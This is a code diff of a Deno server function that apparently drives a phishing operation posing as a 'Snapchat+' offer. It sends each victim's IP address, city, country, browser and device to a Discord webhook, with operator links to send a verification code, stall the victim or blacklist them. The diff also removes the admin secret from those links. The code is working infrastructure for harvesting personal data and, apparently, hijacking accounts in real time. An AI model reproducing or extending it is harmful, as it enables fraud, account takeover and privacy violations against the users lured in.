@@ -1,14 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const WEBHOOK_URL = Deno.env.get("DISCORD_WEBHOOK");
-
-async function sendWebhookMessage(payload) {
-  return fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-  });
-}
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const authHeader = req.headers.get("authorization") || "";
@@ -41,8 +33,11 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
-  const expectedSecret = Deno.env.get("ADMIN_PASSWORD") || "";
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -54,20 +49,24 @@ Deno.serve(async (req) => {
       { name: "🌍 Pays", value: finalCountry, inline: true },
       { name: "🏙️ Ville", value: finalCity, inline: true },
       { name: "🌐 Navigateur", value: finalBrowser, inline: true },
-      { name: "💾 Appareil", value: finalDevice, inline: false },
+      { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [Envoyer le code](${appUrl}/?trigger=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n❌ [Mauvais numéro](${appUrl}/?action=wrong&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n⏳ [Faire patienter](${appUrl}/?action=wait&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${finalIp}&s=${encodeURIComponent(expectedSecret)})`,
-        inline: false,
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+        inline: false
       },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  await sendWebhookMessage({ embeds: [embed] });
+  await fetch(DISCORD_WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+  });
 
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
